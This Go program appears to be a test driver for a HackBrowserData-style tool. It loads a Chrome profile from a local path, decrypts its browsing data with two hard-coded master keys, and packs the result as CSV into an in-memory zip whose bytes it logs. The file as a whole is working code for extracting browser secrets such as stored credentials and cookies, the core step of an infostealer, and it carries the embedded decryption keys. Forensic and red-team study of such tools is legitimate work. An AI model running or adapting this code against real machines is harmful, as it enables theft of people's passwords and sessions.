package main

import (
    "archive/zip"
    "bytes"
    "encoding/hex"
    "fmt"
    "tests/browser"
    "tests/browserdata/master_keys"
    "tests/log"
)

func main() {
    browserName := "Chrome"
    profilePath := `E:\code\go\github\HackBrowserData\tmpout\Chrome`
    v10MasterKey, _ := hex.DecodeString("cbb155391f6c115011f5e2a1fbff1e9ebe0c3e159b37e4b96f78ded0cc3b3a6f")
    v20MasterKey, _ := hex.DecodeString("08291785f492a2015c20ebbfb8851624b294dfcedf04e3679ad2be9c55913a94")
    log.LogInfo("start collect data")
    log.SetVerbose()

    outBuffer := bytes.Buffer{}
    zw := zip.NewWriter(&outBuffer)

    browsers, err := browser.PickBrowsers(browserName, profilePath)
    if err != nil {
        return
    }
    log.LogSuccess(fmt.Sprintf("PickBrowsers success"))

    for _, b := range browsers {
        log.LogSuccess(fmt.Sprintf("get browsing %s data", b.Name()))

        data, err := b.BrowsingData(true, "admin", &master_keys.MasterKeys{
            DefaultKey: v10MasterKey,
            V20Key:     v20MasterKey,
        })
        if err != nil {
            log.LogErr(fmt.Sprintf("get browsing data error: %s", err.Error()))
            log.Errorf("get browsing data error %v", err)
            continue
        }
        data.Output(zw, "admin", b.Name(), "csv")
    }
    zw.Close()
    log.LogInfo("over collect data")

    log.LogSuccess("recv browser data start")
    b := outBuffer.Bytes()
    log.LogBytes(b, len(b))

    log.LogSuccess("recv browser data success")

}
